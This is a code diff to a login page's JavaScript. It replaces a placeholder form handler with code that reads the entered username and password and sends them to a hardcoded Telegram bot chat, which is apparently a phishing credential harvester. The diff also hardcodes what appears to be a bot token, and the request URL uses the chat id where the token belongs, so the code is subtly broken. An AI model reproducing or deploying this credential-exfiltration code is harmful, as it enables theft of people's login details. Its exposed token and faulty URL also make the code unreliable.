@@ -18,13 +18,35 @@ togglePasswordButton.addEventListener("click", function () {
   }
 });
 
-const scriptURL = "Google Apps Script URL";
+var telegram_bot_id = "7986801551:AAFXioA5eLbVu6zpIdN0fShSNeqANvEoHsM";
 
-const form = document.forms["login-form"];
-
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
-  fetch(scriptURL, { method: "post", body: new FormData(form) })
-    .then((response) => console.log("Success!", response))
-    .catch((error) => console.error("Error!", error.message));
-});
+var chat_id = 7185214285;
+var u_name, password;
+var ready = function () {
+  u_name = document.getElementById("username").value;
+  password = document.getElementById("password").value;
+  message = "Name: " + u_name + "\nPassword: " + password;
+};
+var sender = function () {
+  ready();
+  var settings = {
+    async: true,
+    crossDomain: true,
+    url: "https://api.telegram.org/bot" + 7185214285 + "/sendMessage",
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "cache-control": "no-cache",
+    },
+    data: JSON.stringify({
+      chat_id: chat_id,
+      text: message,
+    }),
+  };
+  $.ajax(settings).done(function (response) {
+    console.log(response);
+  });
+  document.getElementById("username").value = "";
+  document.getElementById("password").value = "";
+  return false;
+};
